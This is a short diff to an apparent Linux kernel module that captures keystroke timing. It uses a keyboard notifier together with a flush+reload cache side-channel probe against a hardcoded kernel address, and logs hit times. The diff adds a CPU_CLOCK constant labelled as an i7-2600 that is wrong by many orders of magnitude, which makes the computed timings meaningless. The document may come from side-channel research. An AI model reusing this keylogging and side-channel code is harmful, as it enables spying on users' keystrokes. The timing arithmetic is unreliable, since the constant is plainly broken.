@@ -17,6 +17,10 @@ static u64 last_press = 0;
 
 #define LINE_SIZE 64
 
+
+
+#define CPU_CLOCK 340000000000000000    //TODO: Change to your CPU, Current: I7-2600
+
 #define FUNCTION_ADDRESS 0xffffffffa3f06b20
 
 u64 fenced_rdtsc(void) {
@@ -74,11 +78,11 @@ static int keylogger_notify(struct notifier_block *nb, unsigned long action,
 static int keystroke_timing(void *data) {
   u64 thread_start = ktime_get_seconds(); 
   u64 current_time = thread_start;
-  u64 last_hit_time = fenced_rdtsc(); //TODO:ktime_get_real_ns
+  u64 last_hit_time = (fenced_rdtsc() / CPU_CLOCK); //TODO:ktime_get_real_ns
   while (current_time - thread_start < EXEC_TIME) {
     u64 time = flush_reload_t((void *)(FUNCTION_ADDRESS));
     if (time < threshold) {
-      u64 current_time_ns = fenced_rdtsc();
+      u64 current_time_ns = (fenced_rdtsc() / CPU_CLOCK);
       printk(KERN_INFO "{\'last-hit\': %llu, \'keystroke-time\': %llu}",
              current_time_ns - last_hit_time - time,
              current_time_ns - start_time -
